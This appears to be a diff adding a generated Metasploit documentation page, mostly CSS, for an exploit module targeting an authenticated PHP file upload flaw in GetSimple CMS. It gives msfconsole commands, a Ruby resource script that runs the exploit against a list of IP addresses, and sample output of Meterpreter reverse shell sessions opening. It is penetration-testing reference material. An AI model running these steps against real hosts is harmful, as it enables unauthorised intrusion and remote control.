@@ -1,0 +1,380 @@
+<html>
+<head>
+
+<style>
+h1, h2, h3, h4, h5, h6, p, blockquote {
+    margin: 0;
+    padding: 0;
+}
+body {
+    font-family: Arial, "Helvetica Neue", Helvetica, "Hiragino Sans GB", sans-serif;
+    font-size: 16px;
+    line-height: 18px;
+    color: #737373;
+    margin: 10px 13px 10px 13px;
+}
+a {
+    color: #0069d6;
+}
+a:hover {
+    color: #0050a3;
+    text-decoration: none;
+}
+a img {
+    border: none;
+}
+p {
+    margin-bottom: 16px;
+}
+h1, h2, h3, h4, h5, h6 {
+    color: #404040;
+    line-height: 36px;
+}
+h1 {
+    margin-bottom: 18px;
+    font-size: 30px;
+}
+h2 {
+    font-size: 24px;
+    margin-bottom: 16px;
+}
+h3 {
+    font-size: 18px;
+    margin-bottom: 16px;
+}
+h4 {
+    font-size: 16px;
+    margin-bottom: 16px;
+}
+h5 {
+    font-size: 16px;
+    margin-bottom: 16px;
+}
+h6 {
+    font-size: 13px;
+    margin-bottom: 16px;
+}
+hr {
+    margin: 0 0 19px;
+    border: 0;
+    border-bottom: 1px solid #eee;
+}
+blockquote {
+    padding: 13px 13px 21px 15px;
+    margin-bottom: 18px;
+    font-family:georgia,serif;
+    font-style: italic;
+}
+blockquote:before {
+    content:"\201C";
+    font-size:40px;
+    margin-left:-10px;
+    font-family:georgia,serif;
+    color:#eee;
+}
+blockquote p {
+    font-size: 16px;
+    font-weight: 300;
+    line-height: 18px;
+    margin-bottom: 0;
+    font-style: italic;
+}
+code, pre {
+    font-family: Monaco, Andale Mono, Courier New, monospace;
+}
+code {
+    background-color: #eee;
+    color: rgba(0, 0, 0, 0.75);
+    padding: 1px 3px;
+    font-size: 13px;
+    -webkit-border-radius: 3px;
+    -moz-border-radius: 3px;
+    border-radius: 3px;
+}
+pre {
+    display: block;
+    margin: 0 0 18px;
+    line-height: 16px;
+    font-size: 13px;
+    border: 1px solid #d9d9d9;
+    white-space: pre-wrap;
+    word-wrap: break-word;
+}
+pre code {
+    background-color: #fff;
+    color:#737373;
+    font-size: 13px;
+    padding: 0;
+}
+@media screen and (min-width: 768px) {
+    body {
+        width: 748px;
+        margin:10px auto;
+    }
+}
+#overview_info_button {
+  font-family:Arial, sans-serif;
+  font-size:16px;
+  padding:10px 5px;
+  border-style:solid;
+  border-width:1px;
+  border-color:#EEEEEE;
+  color:#C4C4C4;
+}
+#knowledge_base_button {
+  font-family:Arial, sans-serif;
+  font-size:16px;
+  padding:10px 5px;
+  border-style:solid;
+  border-width:1px;
+  border-color:#ccc;
+  color:#333;
+}
+#overview_info_button:hover, #knowledge_base_button:hover {
+  cursor: pointer;
+}
+#long_list {
+  height:280px;
+  overflow:auto;
+  border-style: solid;
+  border-width: 1px;
+  border-color: #ccc;
+}
+
+
+/*
+Description: Foundation 4 docs style for highlight.js
+Author: Dan Allen <dan.j.allen@gmail.com>
+Website: http://foundation.zurb.com/docs/
+Version: 1.0
+Date: 2013-04-02
+*/
+
+pre code {
+  display: block; padding: 0.5em;
+  background: #eee;
+}
+
+pre .decorator,
+pre .annotation {
+  color: #000077;
+}
+
+pre .attribute {
+  color: #070;
+}
+
+pre .value,
+pre .string,
+pre .scss .value .string {
+  color: #d14;
+}
+
+pre .comment {
+  color: #998;
+  font-style: italic;
+}
+
+pre .function .title {
+  color: #900;
+}
+
+pre .class {
+  color: #458;
+}
+
+pre .id,
+pre .pseudo,
+pre .constant,
+pre .hexcolor {
+  color: teal;
+}
+
+pre .variable {
+  color: #336699;
+}
+
+pre .javadoc {
+  color: #997700;
+}
+
+pre .pi,
+pre .doctype {
+  color: #3344bb;
+}
+
+pre .number {
+  color: #099;
+}
+
+pre .important {
+  color: #f00;
+}
+
+pre .label {
+  color: #970;
+}
+
+pre .preprocessor {
+  color: #579;
+}
+
+pre .reserved,
+pre .keyword,
+pre .scss .value {
+  color: #000;
+}
+
+pre .regexp {
+  background-color: #fff0ff;
+  color: #880088;
+}
+
+pre .symbol {
+  color: #990073;
+}
+
+pre .symbol .string {
+  color: #a60;
+}
+
+pre .tag {
+  color: #007700;
+}
+
+pre .at_rule,
+pre .at_rule .keyword {
+  color: #088;
+}
+
+pre .at_rule .preprocessor {
+  color: #808;
+}
+
+pre .scss .tag,
+pre .scss .attribute {
+  color: #339;
+}
+</style>
+</head>
+<body onload="initDoc()">
+
+<div id="overview_info">
+<h2>GetSimpleCMS PHP File Upload Vulnerability</h2><hr>
+<p>This module exploits a file upload vulnerability in 
+GetSimple CMS. By abusing the upload.php file, a malicious 
+authenticated user can upload an arbitrary file, including 
+PHP code, which results in arbitrary code execution.</p>
+<h2>Module Name</h2><hr>
+<p>exploit/unix/webapp/get_simple_cms_upload_exec</p>
+<h2>Authors</h2><hr><ul><li>Ahmed Elhady Mohamed</li>
+</ul><h2>Platforms</h2><hr>
+<p>php</p>
+<h2>Module Ranking</h2><hr>
+<p><strong>Excellent</strong></p>
+
+<blockquote>
+<p>The exploit will never crash the service. This is the case for SQL Injection, CMD execution, RFI, LFI, etc. No typical
+memory corruption exploits should be given this ranking unless there are extraordinary circumstances.</p>
+</blockquote>
+<h2>Module Traits</h2><hr><h2>Related Pull Requests</h2><hr>
+<p>GITHUB_OAUTH_TOKEN environment variable not set. <a href="https://help.github.com/articles/creating-an-access-token-for-command-line-use/">See how</a></p>
+<h2>References</h2><hr><ul><li>CVE: <a href="https://docs.metasploit.com/docs/using-metasploit/other/why-cve-is-not-available.html">Not available</a></li>
+<li><a href="https://www.exploit-db.com/exploits/25405">EDB-25405</a></li>
+<li>OSVDB (93034)</li>
+</ul><h2>Available Targets</h2><hr><ul><li>Generic (PHP Payload)</li>
+</ul><h2>Required Options</h2><hr><ul><li><p><strong>RHOSTS:</strong> The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html</p></li>
+<li><p><strong>USERNAME:</strong> The username that will be used for authentication process</p></li>
+<li><p><strong>PASSWORD:</strong> The right password for the provided username</p></li>
+</ul><h2>Basic Usage</h2><hr>
+<p><strong>Using get_simple_cms_upload_exec against a single host</strong></p>
+
+<p>Normally, you can use exploit/unix/webapp/get_simple_cms_upload_exec this way:</p>
+<pre><code>msf &gt; use exploit/unix/webapp/get_simple_cms_upload_exec
+msf exploit(get_simple_cms_upload_exec) &gt; show targets
+    ... a list of targets ...
+msf exploit(get_simple_cms_upload_exec) &gt; set TARGET target-id
+msf exploit(get_simple_cms_upload_exec) &gt; show options
+    ... show and set options ...
+msf exploit(get_simple_cms_upload_exec) &gt; exploit
+</code></pre>
+<p><strong>Using get_simple_cms_upload_exec against multiple hosts</strong></p>
+
+<p>But it looks like this is a remote exploit module, which means you can also engage multiple hosts.</p>
+
+<p>First, create a list of IPs you wish to exploit with this module. One IP per line.</p>
+
+<p>Second, set up a background payload listener. This payload should be the same as the one your
+get_simple_cms_upload_exec will be using:</p>
+<ol><li>Do: <code>use exploit/multi/handler</code></li>
+<li>Do: <code>set PAYLOAD [payload]</code></li>
+<li>Set other options required by the payload</li>
+<li>Do: <code>set EXITONSESSION false</code></li>
+<li>Do: <code>run -j</code></li>
+</ol>
+<p>At this point, you should have a payload listening.</p>
+
+<p>Next, create the following script. Notice you will probably need to modify the ip_list path, and
+payload options accordingly:</p>
+<pre><code>&amp;#x3c;ruby&amp;#x3e;
+#
+# Modify the path if necessary
+#
+ip_list = &#39;/tmp/ip_list.txt&#39;
+
+File.open(ip_list, &#39;rb&#39;).each_line do |ip|
+  print_status(&quot;Trying against #{ip}&quot;)
+  run_single(&quot;use exploit/unix/webapp/get_simple_cms_upload_exec&quot;)
+  run_single(&quot;set RHOST #{ip}&quot;)
+  run_single(&quot;set DisablePayloadHandler true&quot;)
+
+  #
+  # Set a payload that&#39;s the same as the handler.
+  # You might also need to add more run_single commands to configure other
+  # payload options.
+  #
+  run_single(&quot;set PAYLOAD [payload name]&quot;)
+
+  run_single(&quot;run&quot;)
+end
+&amp;#x3c;/ruby&amp;#x3e;
+</code></pre>
+<p>Next, run the resource script in the console:</p>
+<pre><code>msf &gt; resource [path-to-resource-script]
+</code></pre>
+<p>And finally, you should see that the exploit is trying against those hosts similar to the following
+MS08-067 example:</p>
+<pre><code>msf &gt; resource /tmp/exploit_hosts.rc
+[*] Processing /tmp/exploit_hosts.rc for ERB directives.
+[*] resource (/tmp/exploit_hosts.rc)&gt; Ruby Code (402 bytes)
+[*] Trying against 192.168.1.80
+
+RHOST =&gt; 192.168.1.80
+DisablePayloadHandler =&gt; true
+PAYLOAD =&gt; windows/meterpreter/reverse_tcp
+LHOST =&gt; 192.168.1.199
+
+[*] 192.168.1.80:445 - Automatically detecting the target...
+[*] 192.168.1.80:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
+[*] 192.168.1.80:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
+[*] 192.168.1.80:445 - Attempting to trigger the vulnerability...
+[*] Sending stage (957999 bytes) to 192.168.1.80
+[*] Trying against 192.168.1.109
+RHOST =&gt; 192.168.1.109
+DisablePayloadHandler =&gt; true
+PAYLOAD =&gt; windows/meterpreter/reverse_tcp
+LHOST =&gt; 192.168.1.199
+[*] 192.168.1.109:445 - Automatically detecting the target...
+[*] 192.168.1.109:445 - Fingerprint: Windows 2003 - Service Pack 2 - lang:Unknown
+[*] 192.168.1.109:445 - We could not detect the language pack, defaulting to English
+[*] 192.168.1.109:445 - Selected Target: Windows 2003 SP2 English (NX)
+[*] 192.168.1.109:445 - Attempting to trigger the vulnerability...
+[*] Meterpreter session 1 opened (192.168.1.199:4444 -&gt; 192.168.1.80:1071) at 2016-03-02 19:32:49 -0600
+
+[*] Sending stage (957999 bytes) to 192.168.1.109
+[*] Meterpreter session 2 opened (192.168.1.199:4444 -&gt; 192.168.1.109:4626) at 2016-03-02 19:32:52 -0600
+</code></pre>
+</div>
+
+</body>
+</html>
